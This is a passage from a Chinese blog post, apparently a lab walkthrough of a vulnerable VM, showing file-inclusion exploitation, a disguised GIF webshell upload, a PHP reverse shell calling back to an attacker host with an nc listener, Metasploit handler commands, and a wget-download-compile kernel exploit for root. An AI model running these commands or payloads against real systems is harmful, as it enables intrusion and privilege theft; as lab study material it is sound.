class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div><div class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div><div class="line">syslog:x:101:103::/home/syslog:/bin/false</div><div class="line">frank:x:1000:1000:frank,,,:/home/frank:/bin/bash</div><div class="line">sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false</div></pre></td></tr></table></figure>
+<p>可以成功利用。再使用PHP伪协议读源码:</p>
+<p><code>curl -X POST -d &quot;file=php://filter/read=convert.base64-encode/resource=files_api.php&quot; http://10.0.2.5:8011/api/files_api.php</code>，并将得到的base64解码得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file = $_POST[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">include</span>($file);</div><div class="line">$get_file = $_GET[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($get_file))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;b&gt;********* HACKER DETECTED *********&lt;/b&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;YOUR IP IS : "</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/p&gt;&lt;p&gt;WRONG INPUT !!&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;No parameter called file passed to me&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;* Note : this API don't use json , so send the file name in raw format&lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/** else&#123;</span></div><div class="line">echo strcmp($file,"/etc/passwd");</div><div class="line">echo strlen($file);</div><div class="line">echo strlen("/etc/passwd");</div><div class="line">if($file == "/etc/passwd")&#123;</div><div class="line">        "HACKER DETECTED ..";</div><div class="line">        &#125;</div><div class="line">&#125;**/</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>再尝试读取<code>/etc/shadow</code>失败。</p>
+<ul>
+<li>80端口服务</li>
+</ul>
+<p>根据扫描结果，访问80端口的<code>robots.txt</code>，没有发现有价值的信息；访问<code>development</code>目录，发现需要账号密码，将破解的hash密码输入后得到提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">* Here is my unfinished tools list</div><div class="line">- the uploader tool (finished but need security review)</div></pre></td></tr></table></figure>
+<p>访问<code>http://10.0.2.5/development/uploader/</code>发现一个上传页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Frank Uploader Script beta version</div><div class="line">Select image to upload:</div><div class="line">TODO : script security &quot;50% FINISHED&quot;</div></pre></td></tr></table></figure>
+<p>上传漏洞可参考：<a href="https://www.freebuf.com/column/194846.html" target="_blank" rel="external">业务逻辑漏洞探索之上传漏洞</a>，<a href="https://myzxcg.github.io/20171116.html" target="_blank" rel="external">文件上传(绕过姿势)</a>，经测试可以发现后端检测了文件头和后缀名，故需要生成文件如<code>test.gif</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cat test.gif </div><div class="line">GIF98</div><div class="line">&lt;?php echo exec("whoami")?&gt;</div></pre></td></tr></table></figure>
+<p>然后上传，但是上传后没有返回路径，此处需要进行猜解，得到最终目录为<code>FRANKuploads</code>。</p>
+<p>但此处只是上传上去了，并没有解析，故需要结合80端口的文件包含漏洞，而php的include并不支持http协议，所以尝试使用<code>curl -X POST -d &quot;file=http://10.0.2.5/development/uploader/FRANKuploads/test.gif?cmd=pwd&quot; http://10.0.2.5:8011/api/files_api.php</code>是不成功的，此处需要继续猜解绝对路径，一般PHP文件都部署在<code>/var/www</code> 或 <code>/var/www/html</code>目录下，经尝试可以得知此处为<code>/var/www</code>，然后进行文件包含：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# curl -X POST -d "file=/var/www/development/uploader/FRANKuploads/test.gif" http://10.0.2.5:8011/api/files_api.php</div><div class="line"></div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">GIF98</div><div class="line">www-data</div></pre></td></tr></table></figure>
+<p>成功得到用户名<code>www-data</code>。得到绝对路径后，可使用之前的文件包含漏洞读取<code>upload.php</code>的源码。</p>
+<p>然后尝试反弹shell，重新生成文件<code>test2.gif</code>，此处使用kali自带的php-reverse-shell.php(/usr/share/webshells/php目录)进行修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GIF98</div><div class="line">...</div><div class="line">$ip = &apos;10.0.2.4&apos;;  // CHANGE THIS</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>将第一行添加GIF98，ip修改为攻击机Kali的ip，上传后重新打开一个终端，执行<code>nc -l -p 1234</code>监听1234端口，在原来的终端执行<code>curl -X POST -d &quot;file=/var/www/development/uploader/FRANKuploads/test2.gif&quot; http://10.0.2.5:8011/api/files_api.php</code>进行文件包含:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# nc -l -p 1234</div><div class="line">Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux</div><div class="line"> 10:54:32 up  7:10,  0 users,  load average: 0.00, 0.00, 0.00</div><div class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</div><div class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div><div class="line">/bin/sh: can't access tty; job control turned off</div><div class="line"><span class="meta">$</span><span class="bash"> whoami</span></div><div class="line">www-data</div></pre></td></tr></table></figure>
+<blockquote>
+<p>Webshell可使用msf生成，kali的/usr/share/webshells/目录也自带部分shell，如需更多webshell可参考:<a href="https://github.com/tennc/webshell" target="_blank" rel="external">github-webshell</a>。  </p>
+<p>反弹shell不仅可以使用php脚本，也可以使用php执行系统指令，从而使用其他语言进行反弹，如bash、perl、python、ruby等，可参考<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="external">LINUX下反弹SHELL的种种方式</a>。  </p>
+<p>监听端口除了nc外还经常使用msf，方法如下：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;</span><span class="bash"> use exploit/multi/handler</span></div><div class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> payload linux/armle/shell/reverse_tcp</span></div><div class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> lport xxxx</span></div><div class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> lhost xxx.xxx.xxx.xxx</span></div><div class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> exitonsession <span class="literal">false</span></span></div><div class="line"><span class="meta">&gt;</span><span class="bash"> exploit -j</span></div><div class="line"><span class="meta">&gt;</span><span class="bash"></span></div></pre></td></tr></table></figure>
+</blockquote>
+<p>可以看到新终端成功getshell。</p>
+<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>执行<code>uname -a</code>可以看到linux内核版本为<code>Linux ubuntu 2.6.35-19-generic</code>，与之前nmap扫描结果一致：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> uname <span class="_">-a</span></span></div><div class="line">Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux</div></pre></td></tr></table></figure>
+<p>使用<code>searchsploit</code>查找linux漏洞(也可以使用Google、<a href="https://www.exploit-db.com/" target="_blank" rel="external">https://www.exploit-db.com/</a>)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# searchsploit linux 2.6.35</div><div class="line">------------------------------------------------------------------------------------------------------------ ----------------------------------------</div><div class="line"> Exploit Title                                                                                              |  Path</div><div class="line">                                                                                                            | (/usr/share/exploitdb/)</div><div class="line">------------------------------------------------------------------------------------------------------------ ----------------------------------------</div><div class="line">Linux Kernel 2.6.35 - Network Namespace Remote Denial of Service                                            | exploits/linux/dos/36425.txt</div><div class="line">------------------------------------------------------------------------------------------------------------ ----------------------------------------</div><div class="line">Shellcodes: No Result</div></pre></td></tr></table></figure>
+<p>发现2.6.35版本仅一个漏洞，经测试发现无法使用，将版本改为2.6.36发现有多个漏洞，经测试<code>15285.c</code>可用。首先在Kali本机使用Python启动简单Http服务：<code>cd /usr/share/exploitdb/exploits/linux/local &amp;&amp; python -m SimpleHTTPServer 80</code>，然后在目标机依次执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python -c 'import pty;pty.spawn("/bin/bash")'#获取交互式shell</div><div class="line">cd /tmp#tmp目录所有用户均有权限</div><div class="line">wget http://10.0.2.4/15285.c#下载exp</div><div class="line">gcc 15285.c -o 15285#编译exp</div><div class="line">chmod 777 15285#修改权限</div><div class="line">./15285#执行exp</div></pre></td></tr></table></figure>
+<p>除此之外，也可以15023.c、<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="external">脏牛</a>等进行提权。<br>至此，成功完成权限提升，执行<code>id</code>可以看到当前权限为root权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># id</div><div class="line">id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">Linux提权对照表</a></p>
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">Windows提权对照表</a></p>
+</blockquote>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/2593" target="_blank" rel="external">https://xz.aliyun.com/t/2593</a></p>
+<p><a href="https://www.4hou.com/technology/13140.html" target="_blank" rel="external">https://www.4hou.com/technology/13140.html</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/文章/" rel="tag"># 文章</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/19/Appscan命令行扫描总结/" rel="next" title="Appscan命令行扫描总结">
+                <i class="fa fa-chevron-left"></i> Appscan命令行扫描总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/11/Java Random安全性分析/" rel="prev" title="Java Random安全性分析">
+                Java Random安全性分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/user.png"
+               alt="zgjx6" />
+          <p class="site-author-name" itemprop="name">zgjx6</p>
+           
+              <p class="site-description motion-element" itemprop="description">zgjx6的个人博客#^_^#</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/zgjx6" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.jianshu.com/u/780c677673ef" target="_blank" title="Jianshu">
+                  
+                    <i class="fa fa-fw fa-book"></i>
+                  
+                  Jianshu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境部署"><span class="nav-number">1.</span> <span class="nav-text">环境部署</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息搜集"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#IP地址"><span class="nav-number">2.0.1.</span> <span class="nav-text">IP地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.0.2.</span> <span class="nav-text">端口扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统测试"><span class="nav-number">3.</span> <span class="nav-text">系统测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#系统扫描"><span class="nav-number">3.0.1.</span> <span class="nav-text">系统扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#服务利用"><span class="nav-number">3.0.2.</span> <span class="nav-text">服务利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#应用测试"><span class="nav-number">4.</span> <span class="nav-text">应用测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#指纹识别"><span class="nav-number">4.0.1.</span> <span class="nav-text">指纹识别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#目录扫描"><span class="nav-number">4.0.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#前端源代码"><span class="nav-number">4.0.3.</span> <span class="nav-text">前端源代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析及利用"><span class="nav-number">4.0.4.</span> <span class="nav-text">漏洞分析及利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#权限提升"><span class="nav-number">4.0.5.</span> <span class="nav-text">权限提升</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zgjx6</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.1"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.1"></script>
+
+
+  
+
+</body>
+</html>
